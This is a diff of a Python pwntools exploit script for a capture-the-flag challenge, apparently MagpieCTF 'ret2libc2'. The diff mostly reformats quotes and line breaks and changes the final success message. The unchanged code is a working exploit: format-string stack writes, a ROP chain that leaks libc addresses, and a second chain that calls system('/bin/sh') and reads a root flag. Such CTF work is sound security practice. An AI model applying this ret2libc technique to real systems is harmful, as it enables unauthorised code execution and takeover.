@@ -123,7 +123,7 @@ def write_stack(
     # _gadget_index (index) is the index of the gadget
     # the address of which _gadget points, gets set to _payload
 
-    packed = _payload # new gadget
+    packed = _payload  # new gadget
     shorts = [packed[i : i + 2] for i in range(0, len(packed), 2)]
     for i, short in enumerate(shorts):
         # calculate least sig. short of address
@@ -202,56 +202,58 @@ def exploit() -> bool:
 
     # creating our gadget
     root = rbp["addr"]
-    write_stack_ptr(io, ptr['index'], fbuffer['addr'], gadget['index'], root)
+    write_stack_ptr(io, ptr["index"], fbuffer["addr"], gadget["index"], root)
 
     # if this worked, then the contents of fbuffer should be an address
     assert (root) == stack_var_int(io, fbuffer["index"])
     io.info(f"Wrote {hex(root)} to {hex(fbuffer['addr'])}")
 
     # need to make a new gadget ptr
-    write_stack_ptr(io, ptr['index'], fbuffer['addr'] - 0x10, gadget['index'], fbuffer['addr'])
-    ptr['index'] = fbuffer['index'] - 2
-    ptr['addr'] = fbuffer['addr'] - 0x10
+    write_stack_ptr(
+        io, ptr["index"], fbuffer["addr"] - 0x10, gadget["index"], fbuffer["addr"]
+    )
+    ptr["index"] = fbuffer["index"] - 2
+    ptr["addr"] = fbuffer["addr"] - 0x10
 
     # if this worked, then the contents of fbuffer should be an address
-    assert (fbuffer['addr']) == stack_var_int(io, ptr["index"])
+    assert (fbuffer["addr"]) == stack_var_int(io, ptr["index"])
     io.info(f"Wrote {hex(fbuffer['addr'])} to {hex(ptr['addr'])}")
 
     # writing the rop chain now
     rop = ROP(exe)
     syms = ["fgets", "puts", "printf", "getchar", "exit"]
     addrs = {}
-    rop.raw(rbp['addr'] + 0x20)
+    rop.raw(rbp["addr"] + 0x20)
     for i, sym in enumerate(syms, 0):
         rop.puts(exe.got[sym])  # type: ignore
 
     # going back to main
     rop.raw(rop.rbp)
-    rop.raw(rbp['addr'] + len(rop.chain()) + 0x18)
+    rop.raw(rbp["addr"] + len(rop.chain()) + 0x18)
     rop.main()  # type: ignore
 
     # writing more stack rbps
     for i in range(10):
         rop.main()  # type: ignore
-        rop.raw(rbp['addr'] + len(rop.chain()) + 0x10)
-    
+        rop.raw(rbp["addr"] + len(rop.chain()) + 0x10)
+
     # logging for fun
     io.info(rop.dump())
     # show_suspects(io) # gdb breakpoint
 
     # ropping the stack
-    write_stack(io, ptr['index'], root, fbuffer['index'], rop.chain())
+    write_stack(io, ptr["index"], root, fbuffer["index"], rop.chain())
     # show_suspects(io) # gdb breakpoint
 
     # activate rop
-    #io.info(leak_stack_contents(io, 70, 17).decode('ascii'))
+    # io.info(leak_stack_contents(io, 70, 17).decode('ascii'))
     exit_prog(io)
 
     # leaking addresses
     raddrs = io.recvuntil(b"\nssh", drop=True)
-    raddrs = raddrs.split(b'\n')
+    raddrs = raddrs.split(b"\n")
     for i, sym in enumerate(syms):
-        addrs[sym] = unpack(raddrs[i].ljust(8, b'\0'))
+        addrs[sym] = unpack(raddrs[i].ljust(8, b"\0"))
         io.success(f"{sym}@libc {hex(addrs[sym])}")
 
     # confirming libc
@@ -262,7 +264,7 @@ def exploit() -> bool:
 
     # eating stdin
     io.recvuntil(b"> ")
-    
+
     #
     ## ropping again!
     #
@@ -277,13 +279,15 @@ def exploit() -> bool:
     }  # actually starts at 18, but the new gadget pointer will live at 18
 
     # leaking stack contents
-    rsp = stack_var_int(io, rbp['index']) - 0x10 - 0x60
+    rsp = stack_var_int(io, rbp["index"]) - 0x10 - 0x60
     rbp["addr"] = rsp + 0x60
     ptr["addr"] = stack_var_int(io, ptr["index"])
-    show_suspects(io) # gdb breakpoint
+    show_suspects(io)  # gdb breakpoint
 
     # confirming that ptr is relative to rbp
-    assert rbp['addr'] == ptr["addr"] - 0x20, f"{hex(rbp['addr'])} is not {hex(ptr["addr"])} - 0x20"
+    assert (
+        rbp["addr"] == ptr["addr"] - 0x20
+    ), f"{hex(rbp['addr'])} is not {hex(ptr["addr"])} - 0x20"
 
     # getting the address of our gadget
     gadget["addr"] = stack_var_int(io, gadget["index"])
@@ -301,38 +305,40 @@ def exploit() -> bool:
     io.info(f"ptr->gadget is at {hex(ptr['addr'])}")
     io.info(f"flag buffer is at {hex(fbuffer['addr'])}")
     # show_suspects(io) # gdb breakpoint
-    
+
     # creating our gadget
     root = rbp["addr"]
-    write_stack_ptr(io, ptr['index'], fbuffer['addr'], gadget['index'], root)
+    write_stack_ptr(io, ptr["index"], fbuffer["addr"], gadget["index"], root)
 
     # if this worked, then the contents of fbuffer should be an address
     assert (root) == stack_var_int(io, fbuffer["index"])
     io.info(f"Wrote {hex(root)} to {hex(fbuffer['addr'])}")
 
     # need to make a new gadget ptr
-    write_stack_ptr(io, ptr['index'], fbuffer['addr'] - 0x10, gadget['index'], fbuffer['addr'])
-    ptr['index'] = fbuffer['index'] - 2
-    ptr['addr'] = fbuffer['addr'] - 0x10
+    write_stack_ptr(
+        io, ptr["index"], fbuffer["addr"] - 0x10, gadget["index"], fbuffer["addr"]
+    )
+    ptr["index"] = fbuffer["index"] - 2
+    ptr["addr"] = fbuffer["addr"] - 0x10
 
     # if this worked, then the contents of fbuffer should be an address
-    assert (fbuffer['addr']) == stack_var_int(io, ptr["index"])
+    assert (fbuffer["addr"]) == stack_var_int(io, ptr["index"])
     io.info(f"Wrote {hex(fbuffer['addr'])} to {hex(ptr['addr'])}")
-    show_suspects(io) # gdb breakpoint
+    show_suspects(io)  # gdb breakpoint
 
     ## another rop chain!
     rop = ROP(libc)
     rop.raw(rop.ret)
     rop.raw(rop.ret)
-    rop.system(next(libc.search(b"/bin/sh"))) # type: ignore
-    
+    rop.system(next(libc.search(b"/bin/sh")))  # type: ignore
+
     # ropping the stack
-    write_stack(io, ptr['index'], root, fbuffer['index'], rop.chain())
-    show_suspects(io) # gdb breakpoint
+    write_stack(io, ptr["index"], root, fbuffer["index"], rop.chain())
+    show_suspects(io)  # gdb breakpoint
 
     # activate the rop chain
     exit_prog(io)
-    
+
     # enjoy your shell!
     io.sendline(b"cat flag.root.txt")
     flag = io.recvuntil(b"\n", drop=True).decode("ascii")
@@ -341,8 +347,9 @@ def exploit() -> bool:
     with open("./flag.root.txt", "r") as f_in:
         buf = f_in.readline().strip()
         if buf in flag:
-            io.success(f"Flag: {flag}")
+            io.success("MagpieCTF - ret2libc2 : True")
             return True
+        io.failure("MagpieCTF - ret2libc2 : False")
         return False
 
 
